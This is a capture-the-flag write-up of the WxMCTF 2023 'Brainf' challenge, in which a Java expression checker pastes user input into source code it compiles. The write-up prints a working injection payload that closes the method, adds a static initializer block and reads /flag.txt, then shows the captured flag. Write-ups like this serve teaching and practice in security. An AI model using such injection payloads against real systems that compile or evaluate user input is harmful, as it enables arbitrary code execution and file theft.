# Brainf - WxMCTF 2023
![](https://img.shields.io/badge/category-pwn-blue) ![](https://img.shields.io/badge/author-BattleMage0231-orange)

## Description
Here at WLMAC, we offer superior courses like ICS5U. Don't believe me? Here's my ICS5U ISP which is a program that can tell you if ANY Java expression is valid. The flag can be located at /flag.txt

Hint: https://docs.oracle.com/javase/tutorial/java/javaOO/initial.html

[ExprChecker.java](dist/ExprChecker.java)

## Solution

Let's try running the Java program locally.

```
This program will check whether a string you enter is a valid Java expression.
For example, "a" + 3 + (4 / 5) and new Object() are valid expressions.
Enter a string: 1 + 2
You entered a valid expression.
```

What if we enter an invalid expression?

```
This program will check whether a string you enter is a valid Java expression.
For example, "a" + 3 + (4 / 5) and new Object() are valid expressions.
Enter a string: abc
Error on line 4: cannot find symbol
  symbol:   variable abc
  location: class Helper
Error on line 4: illegal parenthesized expression
You entered an invalid expression.
```

It looks like the program is dynamically compiling a class called Helper to check whether the expression we entered is valid. We can confirm this by looking at the code.

```java
FileWriter writer = new FileWriter("./Helper.java");
writer.write("public class Helper {\n");
writer.write("    public static int checksum = 1337;\n");
writer.write("    public static Object eval() {\n");
writer.write("        return (Object) (" + expr + ");\n");
writer.write("    }\n");
writer.write("}\n");
writer.close();
```

The check method tries to compile Helper.java and checks if it was successful. It also checks that the value of checksum in the class is 1337, something that we will use later.

But how can we find the flag which is located at /flag.txt on the file system? First, we will realize that Helper.java is vulnerable to code injection. For example, we can supply the payload `3); } static void foo() { /* our code here */ } static void bar() { int a = (3`, which definitely isn't a valid java expression.

```
This program will check whether a string you enter is a valid Java expression.
For example, "a" + 3 + (4 / 5) and new Object() are valid expressions.
Enter a string: 3); } static void foo() { /* our code here */ } static void bar() { int a = (3
You entered a valid expression.
```

```java
public class Helper {
    public static int checksum = 1337;
    public static Object eval() {
        return (Object) (3); } static void foo() { /* our code here */ } static void bar() { int a = (3);
    }
}
```

In foo, we will write to read the flag and print it.

```java
static void foo() {
    try {
        System.out.println((new java.util.Scanner(new java.io.File("/flag.txt"))).nextLine());
    } catch(Exception e) {}
}
```

One problem, ExprChecker.java doesn't actually call any methods in Helper.java. To bypass this, we will exploit static blocks, which allow code to be executed as soon as a class is accessed for the first time. When the program checks the value of checksum, it is accessing the class. We will add `static { foo(); }` to the payload.

Final Payload:
```
3); } static void foo() { try { System.out.println((new java.util.Scanner(new java.io.File("/flag.txt"))).nextLine());} catch(Exception e) {} } static { foo(); } static void bar() { int a = (3
```

```
This program will check whether a string you enter is a valid Java expression.
For example, "a" + 3 + (4 / 5) and new Object() are valid expressions.
Enter a string: 3); } static void foo() { try { System.out.println((new java.util.Scanner(new java.io.File("/flag.txt"))).nextLine());} catch(Exception e) {} } static { foo(); } static void bar() { int a = (3
wxmctf{1_l0ve_5t4t1c_bl0cks_H3fxpZ}
You entered a valid expression.
```

Flag: `wxmctf{1_l0ve_5t4t1c_bl0cks_H3fxpZ}`
